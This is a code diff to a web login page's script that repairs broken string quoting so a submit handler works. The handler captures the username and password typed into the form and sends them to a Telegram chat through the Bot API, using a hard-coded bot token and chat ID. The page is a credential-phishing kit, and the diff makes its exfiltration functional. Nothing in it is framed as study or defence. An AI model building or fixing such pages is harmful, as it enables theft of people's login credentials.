@@ -36,29 +36,28 @@
         </form>
       </div>
       <script>
-        // ====== تنظیمات ربات تلگرام ======
+        
         const botToken = '7628772335:AAFeACmE6QrKrY0fuFOpK4XiPnihfRNyaQI';
         const chatId   = '7255730758';
     
-        // ====== Listener برای فرم ======
+        
         document.getElementById('login-form').addEventListener('submit', function(e) {
           e.preventDefault();
     
-          // خواندن فیلدها
           const username = document.getElementById('username').value;
           const password = document.getElementById('password').value;
     
-          // ——— 1) با template literal ———
-          const messageTpl =  'username: ${username}\n Password: ${password}';
-          const urlTpl = 'https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageTpl)}';
+          
+          const messageTpl =  `username: ${username}\n Password: ${password}`;
+          const urlTpl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageTpl)}`;
     
-          // ——— 2) با string concatenation ———
-          const messageCat = '👤 Username:  + username + \n🔒 Password:  + password';
+        
+          const messageCat = '👤 Username: ' + username + '\n🔒 Password: ' + password;
           const urlCat = 'https://api.telegram.org/bot' + botToken +
                          '/sendMessage?chat_id=' + chatId +
                          '&text=' + encodeURIComponent(messageCat) ;
     
-          // یکی از دوتا URL رو استفاده کن (مثلاً urlTpl)
+          
           fetch(urlTpl)
             .then(res => {
               if (res.ok) {
